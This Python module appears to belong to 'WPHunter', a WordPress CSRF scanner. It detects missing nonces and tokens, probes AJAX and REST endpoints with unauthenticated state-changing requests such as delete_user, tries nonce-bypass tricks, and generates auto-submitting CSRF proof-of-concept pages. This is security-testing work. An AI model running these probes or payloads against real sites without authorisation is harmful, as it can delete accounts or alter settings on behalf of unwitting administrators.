"""
WPHunter - Professional CSRF Scanner
====================================
Comprehensive Cross-Site Request Forgery detection for WordPress.

Techniques:
1. WordPress nonce validation (correct format check)
2. Generic CSRF token detection
3. GET form CSRF detection
4. AJAX endpoint CSRF testing
5. REST API CSRF testing
6. SameSite cookie validation
7. CSRF bypass techniques
8. Plugin form scanning
9. Nonce validation testing
10. PoC generation

CWE-352: Cross-Site Request Forgery
"""

import asyncio
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from urllib.parse import urljoin, urlparse

from bs4 import BeautifulSoup

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class CSRFFinding:
    """CSRF vulnerability finding with PoC."""
    url: str
    method: str
    evidence: str
    severity: str = "medium"
    cwe: str = "CWE-352"
    form_id: Optional[str] = None
    bypass_technique: Optional[str] = None
    poc: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return {
            "type": "CSRF",
            "url": self.url,
            "method": self.method,
            "evidence": self.evidence[:300],
            "severity": self.severity,
            "cwe": self.cwe,
            "bypass_technique": self.bypass_technique,
            "has_poc": self.poc is not None
        }


class CSRFScanner:
    """
    Professional WordPress CSRF vulnerability scanner.
    
    Tests 10 different CSRF detection and bypass techniques.
    """
    
    # Critical AJAX actions
    CRITICAL_AJAX_ACTIONS = [
        "delete_user", "update_user", "add_user",
        "delete_post", "edit_post", "trash_post",
        "install_plugin", "activate_plugin", "update_plugin", "delete_plugin",
        "install_theme", "activate_theme", "delete_theme",
        "edit_theme", "update_option", "save_settings",
    ]
    
    # Critical REST endpoints
    CRITICAL_REST_ENDPOINTS = [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages",
        "/wp-json/wp/v2/settings",
        "/wp-json/wp/v2/plugins",
        "/wp-json/wp/v2/themes",
    ]
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[CSRFFinding] = []
        self.rate_limiter = get_rate_limiter()
        self.tested_urls: Set[str] = set()
    
    async def scan(self, forms: List[Dict] = None) -> List[CSRFFinding]:
        """Run comprehensive CSRF scan."""
        logger.section("CSRF Vulnerability Scan (10 Techniques)")
        
        # 1. Scan provided forms
        if forms:
            logger.info(f"Analyzing {len(forms)} forms...")
            for form in forms:
                await self._analyze_form(form, "")
        
        # 2. Discover and scan admin forms
        await self._scan_admin_forms()
        
        # 3. Test AJAX endpoints
        await self._check_ajax_csrf()
        
        # 4. Test REST API
        await self._check_rest_api_csrf()
        
        # 5. Check SameSite cookies
        await self._check_samesite_cookie()
        
        # 6. Scan plugin forms
        await self._scan_plugin_forms()
        
        logger.success(f"CSRF scan: {len(self.findings)} findings")
        return self.findings
    
    async def _analyze_form(self, form: Dict, page_html: str):
        """Analyze form for CSRF protection."""
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        
        # Skip if already tested
        form_key = f"{method}:{action}"
        if form_key in self.tested_urls:
            return
        self.tested_urls.add(form_key)
        
        # Check CSRF protection
        is_protected = self._detect_any_csrf_protection(form, page_html)
        
        if is_protected:
            logger.debug(f"Form protected: {action}")
            # Still test for bypasses
            await self._test_csrf_bypass_techniques(action, method, form)
            return
        
        # Calculate severity
        severity = self._calculate_severity(action, method, form)
        
        # GET forms that modify state = CRITICAL
        if method == "GET":
            if self._is_state_changing_action(action):
                finding = CSRFFinding(
                    url=action,
                    method=method,
                    evidence="GET form performs state-changing operation without CSRF protection",
                    severity="critical",
                    form_id=form.get("id")
                )
                finding.poc = self._generate_csrf_poc(finding, form)
                self.findings.append(finding)
                logger.vuln("critical", f"GET CSRF: {action}")
        
        # POST forms without protection
        elif method == "POST":
            if severity in ["critical", "high"]:
                finding = CSRFFinding(
                    url=action,
                    method=method,
                    evidence=f"Critical POST form without CSRF protection",
                    severity=severity,
                    form_id=form.get("id")
                )
                finding.poc = self._generate_csrf_poc(finding, form)
                self.findings.append(finding)
                logger.vuln(severity, f"POST CSRF: {action}")
    
    def _detect_any_csrf_protection(self, form: Dict, html: str) -> bool:
        """Detect ANY form of CSRF protection."""
        
        # 1. WordPress nonce
        if self._has_wordpress_nonce(form):
            return True
        
        # 2. Generic CSRF tokens
        csrf_fields = [
            "csrf_token", "csrf", "_csrf", "token", "_token",
            "authenticity_token", "xsrf_token", "_xsrf"
        ]
        
        inputs = form.get("inputs", [])
        for inp in inputs:
            name = inp.get("name", "").lower()
            value = inp.get("value", "")
            
            if any(csrf in name for csrf in csrf_fields):
                # Verify token has a value
                if value and len(value) >= 10:
                    logger.debug(f"CSRF token found: {name}")
                    return True
        
        # 3. Meta tag CSRF (used in AJAX)
        if re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']{10,})', html):
            logger.debug("CSRF meta tag found")
            return True
        
        # 4. Hidden input with token pattern
        if re.search(r'<input[^>]+type=["\']hidden["\'][^>]+value=["\']([a-f0-9]{32,})', html):
            logger.debug("Generic token pattern found")
            return True
        
        return False
    
    def _has_wordpress_nonce(self, form: Dict) -> bool:
        """Check for valid WordPress nonce."""
        inputs = form.get("inputs", [])
        
        # Find WordPress nonce fields
        nonce_fields = [
            inp for inp in inputs
            if "_wpnonce" in inp.get("name", "").lower() or
               inp.get("name", "").lower() == "_wpnonce" or
               "wp_nonce" in inp.get("name", "").lower()
        ]
        
        if not nonce_fields:
            return False
        
        for nonce_field in nonce_fields:
            value = nonce_field.get("value", "")
            
            # Verify nonce has a valid value
            if not value or len(value) < 10:
                logger.debug(f"Nonce field '{nonce_field['name']}' is empty or too short")
                return False
            
            # Verify WordPress format (10 chars alphanumeric)
            if not re.match(r'^[a-f0-9]{10}$', value):
                logger.debug(f"Nonce value doesn't match WordPress format: {value}")
                return False
            
            # If we find ONE valid nonce, form is protected
            return True
        
        return False
    
    def _is_state_changing_action(self, action: str) -> bool:
        """Check if action modifies state."""
        state_changing = [
            "delete", "remove", "update", "edit", "create", "add",
            "approve", "reject", "activate", "deactivate",
            "publish", "unpublish", "trash", "restore",
            "reset", "change", "modify", "save", "install"
        ]
        
        action_lower = action.lower()
        return any(keyword in action_lower for keyword in state_changing)
    
    def _calculate_severity(self, action: str, method: str, form: Dict) -> str:
        """Calculate real CSRF severity."""
        action_lower = action.lower()
        
        # CRITICAL actions
        critical_keywords = [
            "delete", "remove", "trash", "destroy",
            "user", "plugin", "theme", "install", "activate",
            "upload", "execute", "eval", "admin",
            "permission", "role", "capability",
            "password", "reset", "recover"
        ]
        
        # HIGH actions
        high_keywords = [
            "edit", "update", "modify", "change", "save",
            "publish", "unpublish", "post", "page",
            "setting", "option", "config",
            "payment", "order", "transaction"
        ]
        
        # MEDIUM actions
        medium_keywords = [
            "comment", "like", "subscribe", "follow",
            "vote", "rate", "review"
        ]
        
        # Check keywords
        if any(kw in action_lower for kw in critical_keywords):
            return "critical"
        
        if any(kw in action_lower for kw in high_keywords):
            return "high"
        
        if any(kw in action_lower for kw in medium_keywords):
            return "medium"
        
        # GET + state-changing = CRITICAL
        if method == "GET" and self._is_state_changing_action(action):
            return "critical"
        
        return "medium"
    
    async def _scan_admin_forms(self):
        """Scan WordPress admin forms."""
        logger.info("Scanning admin forms...")
        
        admin_pages = [
            "/wp-admin/",
            "/wp-admin/options-general.php",
            "/wp-admin/users.php",
            "/wp-admin/plugins.php",
        ]
        
        for page in admin_pages:
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.get(page)
                
                if response.ok:
                    forms = self._extract_forms(response.text)
                    for form in forms:
                        await self._analyze_form(form, response.text)
                        
            except Exception as e:
                logger.debug(f"Error scanning {page}: {e}")
                continue
    
    def _extract_forms(self, html: str) -> List[Dict]:
        """Extract forms from HTML."""
        forms = []
        
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            for form_tag in soup.find_all('form'):
                form = {
                    "action": form_tag.get('action', ''),
                    "method": form_tag.get('method', 'GET'),
                    "id": form_tag.get('id'),
                    "inputs": []
                }
                
                # Extract inputs
                for inp in form_tag.find_all('input'):
                    form["inputs"].append({
                        "name": inp.get('name', ''),
                        "type": inp.get('type', 'text'),
                        "value": inp.get('value', '')
                    })
                
                forms.append(form)
                
        except Exception as e:
            logger.debug(f"Error extracting forms: {e}")
        
        return forms
    
    async def _check_ajax_csrf(self):
        """Test AJAX endpoints for CSRF."""
        logger.info("Testing AJAX CSRF...")
        
        for action in self.CRITICAL_AJAX_ACTIONS[:5]:  # Limit to avoid noise
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.post(
                    "/wp-admin/admin-ajax.php",
                    data={"action": action, "id": 1}
                )
                
                # If succeeds without nonce = CSRF
                if response.ok and response.status_code == 200:
                    # Verify it's not just an error
                    if "success" in response.text.lower() or response.is_json:
                        finding = CSRFFinding(
                            url=f"/wp-admin/admin-ajax.php?action={action}",
                            method="POST",
                            evidence="AJAX endpoint accepts requests without nonce",
                            severity="critical",
                            bypass_technique="ajax_no_nonce"
                        )
                        finding.poc = self._generate_ajax_poc(action)
                        self.findings.append(finding)
                        logger.vuln("critical", f"AJAX CSRF: action={action}")
                        
            except Exception:
                continue
    
    async def _check_rest_api_csrf(self):
        """Test REST API CSRF."""
        logger.info("Testing REST API CSRF...")
        
        for endpoint in self.CRITICAL_REST_ENDPOINTS[:3]:  # Limit
            await self.rate_limiter.acquire()
            
            try:
                # Attempt POST without X-WP-Nonce
                response = await self.http.post(
                    endpoint,
                    json={"test": "data"}
                    # No X-WP-Nonce header
                )
                
                # If succeeds = CSRF
                if response.status_code in [200, 201]:
                    finding = CSRFFinding(
                        url=endpoint,
                        method="POST",
                        evidence="REST API endpoint accepts authenticated requests without X-WP-Nonce",
                        severity="critical",
                        bypass_technique="rest_no_nonce"
                    )
                    finding.poc = self._generate_rest_poc(endpoint)
                    self.findings.append(finding)
                    logger.vuln("critical", f"REST CSRF: {endpoint}")
                    
            except Exception:
                continue
    
    async def _check_samesite_cookie(self):
        """Check SameSite cookie attribute."""
        logger.info("Checking SameSite cookies...")
        
        try:
            response = await self.http.get("/")
            
            # Check Set-Cookie headers
            for cookie in response.cookies:
                # WordPress auth cookies
                if "wordpress_" in cookie.name.lower() or "wp-" in cookie.name.lower():
                    
                    # Check SameSite
                    if not cookie.has_nonstandard_attr("SameSite"):
                        self.findings.append(CSRFFinding(
                            url="/",
                            method="N/A",
                            evidence=f"Auth cookie '{cookie.name}' without SameSite attribute",
                            severity="medium",
                            bypass_technique="no_samesite"
                        ))
                        logger.warning(f"Cookie {cookie.name} lacks SameSite")
                    
                    # Check Secure flag on HTTPS
                    if self.http.base_url.startswith("https") and not cookie.secure:
                        logger.warning(f"Cookie {cookie.name} lacks Secure flag on HTTPS")
                        
        except Exception as e:
            logger.debug(f"SameSite check error: {e}")
    
    async def _test_csrf_bypass_techniques(self, action: str, method: str, form: Dict):
        """Test CSRF protection bypass techniques."""
        
        # Bypass 1: Empty nonce
        try:
            response = await self.http.post(
                action,
                data={"_wpnonce": "", "action": "test"}
            )
            
            if response.ok and "error" not in response.text.lower():
                self.findings.append(CSRFFinding(
                    url=action,
                    method=method,
                    evidence="Nonce validation bypassed with empty nonce",
                    severity="critical",
                    bypass_technique="empty_nonce"
                ))
                logger.vuln("critical", f"Empty nonce bypass: {action}")
        except:
            pass
        
        # Bypass 2: JSON Content-Type
        try:
            response = await self.http.post(
                action,
                json={"action": "test"}
            )
            
            if response.ok:
                self.findings.append(CSRFFinding(
                    url=action,
                    method=method,
                    evidence="CSRF protection bypassed via JSON Content-Type",
                    severity="high",
                    bypass_technique="json_bypass"
                ))
                logger.vuln("high", f"JSON bypass: {action}")
        except:
            pass
    
    async def _scan_plugin_forms(self):
        """Scan plugin admin forms."""
        logger.info("Scanning plugin forms...")
        
        # Common plugin admin pages
        plugin_pages = [
            "/wp-admin/admin.php?page=wc-settings",  # WooCommerce
            "/wp-admin/admin.php?page=elementor",
            "/wp-admin/admin.php?page=contact-form-7",
        ]
        
        for page in plugin_pages[:2]:  # Limit
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.get(page)
                
                if response.ok:
                    forms = self._extract_forms(response.text)
                    for form in forms:
                        await self._analyze_form(form, response.text)
                        
            except Exception:
                continue
    
    def _generate_csrf_poc(self, finding: CSRFFinding, form: Dict) -> str:
        """Generate CSRF PoC HTML."""
        action = finding.url
        method = finding.method
        
        if method == "GET":
            poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - GET</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>Target: {action}</p>
<img src="{action}?confirm=yes" style="display:none" />
<script>
// Auto-trigger via image
window.location = "{action}?confirm=yes";
</script>
</body>
</html>"""
        
        else:  # POST
            inputs_html = ""
            for inp in form.get("inputs", []):
                name = inp.get("name", "")
                value = inp.get("value", "")
                if name:
                    inputs_html += f'    <input type="hidden" name="{name}" value="{value}" />\n'
            
            poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - POST</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<p>Target: {action}</p>
<form id="csrf_form" method="POST" action="{action}">
{inputs_html}    <input type="submit" value="Click to Execute CSRF" />
</form>
<script>
// Auto-submit
document.getElementById('csrf_form').submit();
</script>
</body>
</html>"""
        
        return poc
    
    def _generate_ajax_poc(self, action: str) -> str:
        """Generate AJAX CSRF PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>AJAX CSRF PoC</title></head>
<body>
<h1>AJAX CSRF Proof of Concept</h1>
<p>Action: {action}</p>
<script>
fetch('/wp-admin/admin-ajax.php', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
    body: 'action={action}&id=1',
    credentials: 'include'
}})
.then(r => r.text())
.then(data => {{
    document.body.innerHTML += '<pre>Response: ' + data + '</pre>';
}});
</script>
</body>
</html>"""
    
    def _generate_rest_poc(self, endpoint: str) -> str:
        """Generate REST API CSRF PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>REST API CSRF PoC</title></head>
<body>
<h1>REST API CSRF Proof of Concept</h1>
<p>Endpoint: {endpoint}</p>
<script>
fetch('{endpoint}', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{test: 'data'}}),
    credentials: 'include'
}})
.then(r => r.json())
.then(data => {{
    document.body.innerHTML += '<pre>Response: ' + JSON.stringify(data, null, 2) + '</pre>';
}});
</script>
</body>
</html>"""
    
    def get_summary(self) -> Dict:
        """Get comprehensive summary."""
        by_technique = {}
        for finding in self.findings:
            tech = finding.bypass_technique or "no_protection"
            if tech not in by_technique:
                by_technique[tech] = []
            by_technique[tech].append(finding)
        
        return {
            "total": len(self.findings),
            "by_severity": {
                "critical": len([f for f in self.findings if f.severity == "critical"]),
                "high": len([f for f in self.findings if f.severity == "high"]),
                "medium": len([f for f in self.findings if f.severity == "medium"]),
            },
            "by_technique": {tech: len(findings) for tech, findings in by_technique.items()},
            "with_poc": len([f for f in self.findings if f.poc]),
            "findings": [f.to_dict() for f in self.findings]
        }
